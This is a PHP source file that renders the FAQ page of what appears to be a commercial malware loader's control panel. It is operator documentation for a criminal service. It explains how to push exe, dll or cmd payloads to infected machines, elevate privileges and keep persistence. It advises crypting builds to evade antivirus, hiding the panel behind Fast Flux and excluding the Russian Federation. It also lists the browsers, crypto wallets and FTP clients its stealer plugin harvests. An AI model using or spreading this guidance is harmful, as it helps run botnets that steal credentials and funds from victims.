      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.0</b> What types of tasks are there?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td><div>The classic savings of the <b>exe</b> file to disk with subsequent launch is optimal for most tasks.</div>
                         <div>Running <b>exe</b> in memory is only suitable for exe without dependencies, it can help bypass some detections (use only if you know exactly what you are doing).<div>
                         <div>Running the <b>dll</b> will also require you to specify the name of the function to be called from the dll (the maximum length of the name is 18).<div>
                         <div>Running <b>cmd</b> will allow you to download and execute a cmd or bat file.<div>
                         <div><b>Self-removal</b> will remove the loader from the PC, after receiving the task it will turn off, and after restarting the OS it will be physically deleted.<div></td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.1</b> Where to save the local file?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>At the moment, there are several directory options available for saving a file on a local PC. In principle, they are no different, you can choose any one. By default, %tmp% is used. The file name will be taken from the link, as well as each file will be saved to a subfolder with a unique name.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.2</b> Is it worth raising privileges?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>If the downloaded exe works only with administrator rights or requires elevated privileges, you can select \"Elevated Privileges\" when creating a task. Then the file will be run as an administrator. Please note that at the same time, an administrator password request will pop up on PCs running under an account with user rights.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.3</b> Is it possible to create multiple tasks?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Yes, of course.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.3</b> Will the unit perform the task again?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>No, each task is given to each unit only once.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.4</b> What does the statistics give us?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>In the section <a href=\"Show_Tasks.php \">Tasks</a> you can see the completion statistics for each task. A download error means that the file has not been downloaded, usually because of an incorrect link. Startup error - perhaps the file is blocked by antivirus or is not functional on this OS. The success status means the successful completion of the task by the unit.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.5</b> Will the downloaded files work after reboot?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Exe and dll files are put on startup and will continue to work after restarting the PC even if the loader is removed from the PC. Does not apply to cmd files and exe files that were run in memory.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.6</b> FastFlux supported?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Yes, the loader control panel can work through Fast Flux and other server hiding systems.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.7</b> How to update the installed loader?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>The loader update is not provided. An attempt to upload a new loader build will not end in success. If it seems to you that this is stupid and inconvenient - just believe, it's better this way.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.8</b> SSL (https) supported?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>No, secure http is not supported. The loader has built-in RC4 traffic encryption with a key unique for each client, which solves the issue of data security and does not affect the knock rate.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.1.9</b> How many control panel urls does the loader support?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Three at the same time. All work in parallel in three threads, tasks are executed from any.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.0</b> How to order a new build?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>The minimum required information is the url. It can contain both a domain and an IP address. If you do not specify a subfolder, it will be generated automatically randomly. There can be from one to three urls. When creating a build, you can disable options such as autorun, copying to the system, screenshots and plugins. If you want to order a new build for an existing control panel, be sure to specify a subfolder, otherwise it will be random and the build will not work. If you made a mistake in the order to  build, you will need to make a new build. Its paid.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.1</b> Do need to crypt the build?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>There is no need for this, but it will help to make the work more efficient. It also makes sense to crypt the plugin Plugins/Cred.dll</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.2</b> Is it possible to work without a crypt?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Yes.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.3</b> Which crypt service should choose? Recommendations.</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>You can choose any service, all responsibility for its operation is solely on it. There are no recommendations on the choice and there cannot be (responsibility is provided for this).</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.4</b> How to test after crypt?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>It is recommended to personally check the operability after each script on virtual machines. At least the knock and execution of the task with the control of the result on the desktop and server OS.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.5</b> Does the loader work on virtual machines?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Yes, it works. There are no antiVM mechanisms.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.6</b> What are the server requirements?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Recommended: Ubuntu OS 20.04 or 22.04, php7, MySQL or MariaDB, Nginx. 2 or more processor cores, 4 or more gigabytes of RAM, SSD disk.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.7</b> What should I do if the server slows down or often issues 500 series errors?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Install Nginx instead of Apache, if it didn't help to contact the hoster.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.8</b> What are the detects in the file?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>The only way to check it is to take the latest build and send it to the checker. You can do it in person. The loader's support does not check the build every five minutes, does not have the last scan, will not do it on request.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.2.9</b> What should I do if there is no knock?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Check the internet access (in particular to your control panel) from the test stand. Disable firewall and antivirus if necessary. If another copy of the loader has already been launched on the PC, you need to delete it beforehand. If there is no knock from the encrypted file, most likely it is corrupted during the crypt.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.3.0</b> In which regions does the loader not work?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Knock works in any region, performing tasks in any region except the Russian Federation.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.3.1</b> How to prepare the server for installing the loader panel and install it?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>On the example of a vigin <b>Ubuntu 20.04</b>:
                     <div>● Update the server with the commands <b>sudo apt-get update</b> and <b>sudo apt-get upgrade -y</b></div>
                     <div>● Install php fpm using command <b>sudo apt install php-fpm php-mysql -y</b>, for this OS version 7.4 is default</div>
                     <div>● Install MySQL server using command <b>sudo apt install mysql-server -y</b></div>
                     <div>● Create DB and user using commands:</div>
                     <div>&nbsp;</div>
                     <div><b>sudo mysql</b></div>
                     <div><b>ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password by 'you-password-here';</b></div>
                     <div><b>CREATE DATABASE newdb DEFAULT CHARACTER SET utf8 DEFAULT COLLATE utf8_general_ci;</b></div>
                     <div><b>CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'newpassword';</b></div>
                     <div><b>GRANT ALL PRIVILEGES ON *.* TO 'newuser'@'localhost' WITH GRANT OPTION;</b></div>

                     <div><b>exit</b></div>
                     <div>&nbsp;</div>

                     <div>● Install nginx using command <b>sudo apt install nginx -y</b></div>
                     <div>● Edit config using command <b>sudo nano /etc/nginx/sites-available/web</b>, to make it look like this:</div>
                     <div>&nbsp;</div>
                     <div><b>server {</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;listen 80;</p></div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root /var/www/html;</p></div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;index index.php index.html index.htm index.nginx-debian.html;</p></div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server_name example.com;</p></div>
                     <div>&nbsp;</div>
                     <div>&nbsp;&nbsp;&nbsp&nbsp;&nbsp;&nbsp;location / {</p></div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try_files $uri $uri/ =404;</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</div>
                     <div>&nbsp;</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;location ~ \.php$ {</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;include snippets/fastcgi-php.conf;</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</div>
                     <div>&nbsp;</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;location ~ /\.ht {</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;deny all;</div>
                     <div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</div>
                     <div>}</b></div>
                     <div>&nbsp;</div>
                     <div>● Do: <b>sudo ln -s /etc/nginx/sites-available/web /etc/nginx/sites-enabled/</b></div>
                     <div>● and: <b>sudo unlink /etc/nginx/sites-enabled/default</b>, for make this syte default</div>
                     <div>● Restart nginx: <b>sudo systemctl reload nginx</b></div>
                     <div>● Upload panel files to: <b>/var/www/html/subfolder name/</b> using any sFTP client, for example <b>WinSCP</b></div>
                     <div>● Log in to the panel via the WEB interface and set the data from the DB  in the settings, in our case the name <b>newdb</b>, username is <b>newuser</b>, password is <b>newpassword</b></div>
                     <div>● Create table in DB, push last button in settings page</div>
                     <div>● Set chmod 777 on catalogs <b>/Screens</b>, <b>/Sessions</b>, <b>/Credentials</b> and 646 to files <b>/Cfg/Config.php</b> and <b>/Cfg/Options.php</b></div></td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.3.2</b> What is the observer account for?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>The observer account does not have the ability to create and edit tasks, as well as change settings. You can give it to someone to view statistics.</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.3.3</b> What is the link to the task statistics for?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Each task has a link to statistics that is visible without authorization. You can share this information with anyone via the link.</td>
                  </tr>
               </table>";
      sTable();
      sTable();
      sTable();

      echo "<div align = center> 
               <table cellpadding=1 cellspacing=1 width=\"98%\" class=table>
                  <tr height=\"35\">
                     <td>&nbsp;<img src=\"Images\Info.png\">&nbsp;<b>0.3.4</b> Which software is supported by stealer plugin?</td>
                  </tr>
               </table>";

      sTable();

      echo "<div align = center> 
               <table width=\"92%\">
                  <tr>
                     <td>Chrome based, Firefox based, Exodus, Electrum, Armory, DogeCoin, LiteCoin, Monero, FileZilla, Pidgin...</td>
                  </tr>
               </table>";

      sTable();
      sTable();
      sTable();
      sTable();
      sTable();
  
   }

   include("Footer.php");
?>